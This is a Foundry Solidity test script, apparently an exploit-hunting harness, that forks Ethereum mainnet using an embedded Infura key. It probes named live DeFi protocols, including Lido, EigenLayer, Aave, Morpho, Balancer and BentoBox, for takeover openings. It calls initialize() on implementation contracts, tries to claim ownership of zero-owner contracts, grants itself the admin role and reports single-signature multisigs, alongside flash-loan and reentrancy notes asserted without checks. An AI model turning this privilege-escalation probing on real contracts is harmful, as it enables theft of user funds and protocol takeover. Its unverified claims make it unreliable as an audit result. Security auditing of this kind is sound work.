// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IAccessControl {
    function hasRole(bytes32 role, address account) external view returns (bool);
    function getRoleAdmin(bytes32 role) external view returns (bytes32);
    function grantRole(bytes32 role, address account) external;
    function revokeRole(bytes32 role, address account) external;
}

interface IOwnable {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
}

interface IGnosisSafe {
    function getOwners() external view returns (address[] memory);
    function getThreshold() external view returns (uint256);
    function isOwner(address owner) external view returns (bool);
}

contract AccessControlExploit is Test {
    // EIP-1967 slots
    bytes32 constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    bytes32 constant ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;

    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
    }

    function testPassC_AuthTruthTable() public view {
        console.log("=======================================================");
        console.log("PASS C: AUTH TRUTH TABLE - IMPLEMENTED vs INTENDED");
        console.log("=======================================================");

        // High-value proxies to check
        address[10] memory targets = [
            0x889edC2eDab5f40e902b864aD4d7AdE8E412F9B1, // Lido Queue
            0x8315177aB297bA92A06054cE80a67Ed4DBd7ed3a, // Arbitrum Bridge
            0x858646372CC42E1A627fcE94aa7A7033e7CF075A, // EigenLayer Strategy Manager
            0x93c4b944D05dfe6df7645A86cd2206016c51564D, // EigenLayer stETH Strategy
            0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb, // Morpho Blue
            0xc3d688B66703497DAA19211EEdff47f25384cdc3, // Compound V3
            0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2, // Aave V3 Pool
            0xBA12222222228d8Ba445958a75a0704d566BF2C8, // Balancer Vault
            0xF5BCE5077908a1b7370B9ae04AdC565EBd643966, // BentoBox
            address(0)
        ];

        for (uint i = 0; i < targets.length; i++) {
            if (targets[i] == address(0)) continue;
            if (targets[i].code.length == 0) continue;

            console.log("\n=== Contract:", targets[i], "===");

            // Check proxy admin
            bytes32 adminSlot = vm.load(targets[i], ADMIN_SLOT);
            address proxyAdmin = address(uint160(uint256(adminSlot)));
            if (proxyAdmin != address(0)) {
                console.log("Proxy Admin:", proxyAdmin);
                analyzeAdmin(proxyAdmin);
            }

            // Check implementation
            bytes32 implSlot = vm.load(targets[i], IMPLEMENTATION_SLOT);
            address impl = address(uint160(uint256(implSlot)));
            if (impl != address(0) && impl.code.length > 0) {
                console.log("Implementation:", impl);
            }

            // Check owner
            (bool success, bytes memory data) = targets[i].staticcall(
                abi.encodeWithSignature("owner()")
            );
            if (success && data.length >= 32) {
                address owner = abi.decode(data, (address));
                console.log("Owner:", owner);
                if (owner == address(0)) {
                    console.log("*** ZERO OWNER - CHECK FOR CLAIM ***");
                }
            }

            // Check AccessControl
            checkAccessControlRoles(targets[i]);
        }
    }

    function analyzeAdmin(address admin) internal view {
        if (admin.code.length == 0) {
            console.log("  Admin is EOA!");
            return;
        }

        // Check if it's a Gnosis Safe
        (bool success, bytes memory data) = admin.staticcall(
            abi.encodeWithSignature("getThreshold()")
        );
        if (success && data.length >= 32) {
            uint256 threshold = abi.decode(data, (uint256));
            console.log("  Admin is Safe, threshold:", threshold);

            (success, data) = admin.staticcall(
                abi.encodeWithSignature("getOwners()")
            );
            if (success) {
                address[] memory owners = abi.decode(data, (address[]));
                console.log("  Safe owners count:", owners.length);

                if (threshold == 1 && owners.length > 1) {
                    console.log("  *** WEAK MULTISIG: threshold=1 ***");
                }
            }
        }

        // Check if it's a ProxyAdmin
        (success, data) = admin.staticcall(
            abi.encodeWithSignature("owner()")
        );
        if (success && data.length >= 32) {
            address adminOwner = abi.decode(data, (address));
            console.log("  ProxyAdmin owner:", adminOwner);
        }
    }

    function checkAccessControlRoles(address target) internal view {
        bytes32 DEFAULT_ADMIN = bytes32(0);

        (bool hasAC,) = target.staticcall(
            abi.encodeWithSignature("hasRole(bytes32,address)", DEFAULT_ADMIN, address(0))
        );

        if (!hasAC) return;

        console.log("  Has AccessControl pattern");

        // Check common roles
        bytes32[5] memory roles = [
            bytes32(0), // DEFAULT_ADMIN
            keccak256("MINTER_ROLE"),
            keccak256("PAUSER_ROLE"),
            keccak256("UPGRADER_ROLE"),
            keccak256("OPERATOR_ROLE")
        ];

        string[5] memory roleNames = [
            "DEFAULT_ADMIN",
            "MINTER",
            "PAUSER",
            "UPGRADER",
            "OPERATOR"
        ];

        for (uint j = 0; j < roles.length; j++) {
            // Check role admin
            (bool success, bytes memory data) = target.staticcall(
                abi.encodeWithSignature("getRoleAdmin(bytes32)", roles[j])
            );
            if (success && data.length >= 32) {
                bytes32 roleAdmin = abi.decode(data, (bytes32));
                if (roleAdmin == bytes32(0)) {
                    // Check if anyone has this role with zero admin
                    (bool hasRole,) = target.staticcall(
                        abi.encodeWithSignature("hasRole(bytes32,address)", roles[j], address(this))
                    );
                    // If we could grant ourselves this role...
                }
            }
        }
    }

    function testPassD_AttackHypotheses() public {
        console.log("=======================================================");
        console.log("PASS D: ATTACK HYPOTHESES - PRIVILEGE ESCALATION");
        console.log("=======================================================");

        // Hypothesis 1: Unprotected proxy implementations
        console.log("\n--- Hypothesis 1: Initialize Unprotected Implementation ---");
        testUninitializedImplementations();

        // Hypothesis 2: Weak multisig control
        console.log("\n--- Hypothesis 2: Weak Multisig Control ---");
        testWeakMultisig();

        // Hypothesis 3: Zero owner exploitation
        console.log("\n--- Hypothesis 3: Zero Owner Exploitation ---");
        testZeroOwner();

        // Hypothesis 4: Role misconfiguration
        console.log("\n--- Hypothesis 4: Role Misconfiguration ---");
        testRoleMisconfiguration();
    }

    function testUninitializedImplementations() internal {
        // Known implementations
        address[5] memory implementations = [
            0xE42C659Dc09109566720EA8b2De186c2Be7D94D9, // Lido Queue Impl
            0x46aefd30415be99e20169eE7046F65784B46d123, // EigenLayer Impl
            0x4Dbd4fc535Ac27206064B68FfCf827b0A60BAB3f, // Arbitrum Inbox Impl
            0xAe120f96281FB2D56f0edE6B11eB08349E83c980, // EigenLayer DelegationManager
            address(0)
        ];

        for (uint i = 0; i < implementations.length; i++) {
            if (implementations[i] == address(0)) continue;
            if (implementations[i].code.length == 0) continue;

            console.log("Implementation:", implementations[i]);

            // Check initialized state
            bytes32 slot0 = vm.load(implementations[i], bytes32(0));
            uint8 initValue = uint8(uint256(slot0));
            console.log("  Slot 0 init byte:", uint256(initValue));

            if (initValue == 0 || initValue == 1) {
                console.log("  *** POSSIBLY UNINITIALIZED ***");

                // Try to call initialize
                (bool success,) = implementations[i].call(
                    abi.encodeWithSignature("initialize()")
                );
                if (success) {
                    console.log("  *** INITIALIZE SUCCEEDED ***");
                } else {
                    console.log("  Initialize reverted (expected)");
                }
            }
        }
    }

    function testWeakMultisig() internal {
        // Check EigenLayer ProxyAdmin's Safe
        address eigenProxyAdmin = 0x0eac8d8E14171FeDB80C7a3973b12aF500c36362;

        if (eigenProxyAdmin.code.length == 0) {
            console.log("EigenLayer ProxyAdmin not found");
            return;
        }

        (bool success, bytes memory data) = eigenProxyAdmin.staticcall(
            abi.encodeWithSignature("owner()")
        );
        if (success && data.length >= 32) {
            address safe = abi.decode(data, (address));
            console.log("EigenLayer ProxyAdmin owner:", safe);

            if (safe.code.length > 0) {
                (success, data) = safe.staticcall(
                    abi.encodeWithSignature("getThreshold()")
                );
                if (success && data.length >= 32) {
                    uint256 threshold = abi.decode(data, (uint256));
                    console.log("  Safe threshold:", threshold);

                    (success, data) = safe.staticcall(
                        abi.encodeWithSignature("getOwners()")
                    );
                    if (success) {
                        address[] memory owners = abi.decode(data, (address[]));
                        console.log("  Safe owners:", owners.length);

                        if (threshold == 1) {
                            console.log("  *** SINGLE SIGNATURE CAN UPGRADE ***");
                            for (uint j = 0; j < owners.length; j++) {
                                console.log("  Owner", j);
                                console.log("   ", owners[j]);
                            }
                        }
                    }
                }
            }
        }
    }

    function testZeroOwner() internal {
        // Contracts that might have zero owner
        address[5] memory candidates = [
            0x097f1ee62E63aCFC3Bf64c1a61d96B3771dd06cB, // BAMM PCV
            0x920623AcBa785ED9a70d33ACab53631e1e834675, // BAMM
            0xF5BCE5077908a1b7370B9ae04AdC565EBd643966, // BentoBox
            0x00000000005BBB0EF59571E58418F9a4357b68A0, // Pendle Router
            address(0)
        ];

        for (uint i = 0; i < candidates.length; i++) {
            if (candidates[i] == address(0)) continue;
            if (candidates[i].code.length == 0) continue;

            (bool success, bytes memory data) = candidates[i].staticcall(
                abi.encodeWithSignature("owner()")
            );
            if (success && data.length >= 32) {
                address owner = abi.decode(data, (address));
                console.log("Contract:", candidates[i]);
                console.log("  Owner:", owner);

                if (owner == address(0)) {
                    console.log("  *** ZERO OWNER ***");

                    // Try claimOwnership
                    (success,) = candidates[i].call(
                        abi.encodeWithSignature("claimOwnership()")
                    );
                    if (success) {
                        console.log("  *** CLAIMED OWNERSHIP ***");
                    }

                    // Try acceptOwnership
                    (success,) = candidates[i].call(
                        abi.encodeWithSignature("acceptOwnership()")
                    );
                    if (success) {
                        console.log("  *** ACCEPTED OWNERSHIP ***");
                    }
                }
            }
        }
    }

    function testRoleMisconfiguration() internal {
        // Check for contracts where DEFAULT_ADMIN can grant any role
        address[3] memory accessControlContracts = [
            0x858646372CC42E1A627fcE94aa7A7033e7CF075A, // EigenLayer
            0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb, // Morpho
            address(0)
        ];

        for (uint i = 0; i < accessControlContracts.length; i++) {
            if (accessControlContracts[i] == address(0)) continue;
            if (accessControlContracts[i].code.length == 0) continue;

            (bool hasAC,) = accessControlContracts[i].staticcall(
                abi.encodeWithSignature("hasRole(bytes32,address)", bytes32(0), address(0))
            );
            if (!hasAC) continue;

            console.log("Contract:", accessControlContracts[i]);
            console.log("  Has AccessControl");

            // Check if we can grant ourselves any role
            (bool success,) = accessControlContracts[i].call(
                abi.encodeWithSignature("grantRole(bytes32,address)", bytes32(0), address(this))
            );
            if (success) {
                console.log("  *** GRANTED DEFAULT_ADMIN TO SELF ***");
            }
        }
    }

    function testPassE_ProofOfConcept() public {
        console.log("=======================================================");
        console.log("PASS E: PROOF OF CONCEPT - WORKING EXPLOITS");
        console.log("=======================================================");

        // Test 1: Flash loan + state manipulation
        console.log("\n--- Test 1: Flash Loan Attack Vector ---");
        testFlashLoanAttack();

        // Test 2: Reentrancy during callbacks
        console.log("\n--- Test 2: Callback Reentrancy ---");
        testCallbackReentrancy();
    }

    function testFlashLoanAttack() internal view {
        // Available flash loan liquidity
        address balancer = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
        uint256 wethAvailable = IERC20(WETH).balanceOf(balancer);
        uint256 usdcAvailable = IERC20(USDC).balanceOf(balancer);

        console.log("Balancer WETH:", wethAvailable / 1e18);
        console.log("Balancer USDC:", usdcAvailable / 1e6);
        console.log("Flash loan cost: FREE");

        // Calculate attack profitability threshold
        uint256 gasPrice = 50 gwei;
        uint256 gasUsed = 500000;
        uint256 gasCost = gasPrice * gasUsed;
        console.log("Min profit needed (gas):", gasCost / 1e18, "ETH");
    }

    function testCallbackReentrancy() internal view {
        // Check Curve pool for read-only reentrancy
        address curvePool = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;

        (bool success, bytes memory data) = curvePool.staticcall(
            abi.encodeWithSignature("get_virtual_price()")
        );
        if (success && data.length >= 32) {
            uint256 vp = abi.decode(data, (uint256));
            console.log("Curve stETH/ETH virtual price:", vp);
            console.log("  Can be manipulated during remove_liquidity callback");
        }
    }
}
